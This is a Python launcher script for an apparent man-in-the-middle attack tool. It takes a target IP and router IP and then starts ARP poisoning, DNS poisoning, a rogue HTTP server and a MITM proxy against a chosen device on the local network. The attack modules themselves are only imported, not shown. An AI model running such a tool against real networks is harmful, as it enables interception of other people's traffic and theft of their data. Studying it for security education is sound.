#!/usr/bin/env python3
import argparse
import os
import sys
import threading
import time

from queue import Queue

from arp_poisoning import start_arp_poisoning
from http_server import start_http_server_thread
from packet_analysis import start_sniffer_thread
from dns_poisoning import start_dns_poisoning
from mitm_proxy import start_mitm_proxy_thread

from colorama import init, Fore

from input_data import get_target_to_attack, get_router_ip
from utils import run_configuration_commands, run_restoring_commands
from modern_gui import start_gui

init()
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET


def printer(queue, cancel_token):
    print(f"{GREEN}[+] Printing thread started{RESET}")
    while not cancel_token.is_set():
        message = queue.get()
        if message[:3] == "[+]" or message[:3] == "[-]":
            print('\n' + str(message) + '\n#>', end='')
        else:
            print(message)


def start_printer_thread(local_printing_queue):
    cancel_token = threading.Event()
    printer_thread = threading.Thread(target=printer, args=(local_printing_queue, cancel_token), daemon=True,
                                      name="Printer")
    printer_thread.start()
    return cancel_token


def initialize_program(interface_pc, mac_address, ip_address, router_ip, verbosity, local_printing_queue):
    original_tokens_list = []

    if router_ip is None:
        router_ip = get_router_ip()

    run_configuration_commands(router_ip)

    # getting targeted device
    if ip_address is not None:
        targeted_ip = ip_address
    else:
        targeted_device = get_target_to_attack(mac_address, ip_address)
        targeted_ip = targeted_device['ip']

    # starting thread for printing everything
    printing_thread_token = start_printer_thread(local_printing_queue)
    # starting core threads

    arp_poisoning_token = start_arp_poisoning(interface_pc, targeted_ip, router_ip, local_printing_queue, verbosity)

    # sniffer_thread_token = start_sniffer_thread(interface_pc, targeted_ip, router_ip, local_printing_queue,verbosity)

    dns_poisoning_token = start_dns_poisoning(interface_pc, targeted_ip, router_ip, local_printing_queue, verbosity)

    http_server_token = start_http_server_thread(interface_pc, local_printing_queue, verbosity)
    #

    mitm_proxy_token = start_mitm_proxy_thread(local_printing_queue, verbosity)
    # creating list with cancellation tokens
    # original_tokens_list.append(sniffer_thread_token)
    original_tokens_list.append(http_server_token)
    original_tokens_list.append(arp_poisoning_token)
    original_tokens_list.append(dns_poisoning_token)
    original_tokens_list.append(printing_thread_token)
    original_tokens_list.append(mitm_proxy_token)

    return original_tokens_list


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', default="wlan0")
    parser.add_argument('-m', '--mac_address')
    parser.add_argument('-t', "--target_ip")
    parser.add_argument('-r', '--router_ip')
    parser.add_argument('-v', '--verbosity', default=1)
    parser.add_argument('-g', '--gui', default=0)
    # parser.add_argument('-n', '--no-http')
    args = parser.parse_args()

    if os.getuid() != 0:
        print("[-] Run again with sudo privileges")
        exit(1)

    printing_queue = Queue()

    time.sleep(1)
    if int(args.gui):
        start_gui()
    else:
        tokens_list = initialize_program(args.interface, args.mac_address, args.target_ip, args.router_ip,
                                         int(args.verbosity),
                                         printing_queue)
        while True:
            command = input()
            match command:
                case "help":
                    printing_queue.put('''
                    this is help''')
                case "stop":
                    for token in tokens_list:
                        token.set()
                case "exit":
                    for token in tokens_list:
                        token.set()
                    time.sleep(5)
                    run_restoring_commands()
                    print(f"{GREEN}==============Everything stopped=============={RESET}")
                    sys.exit(0)
                case _:
                    printing_queue.put(f"{RED}[-]Not correct command{RESET}")
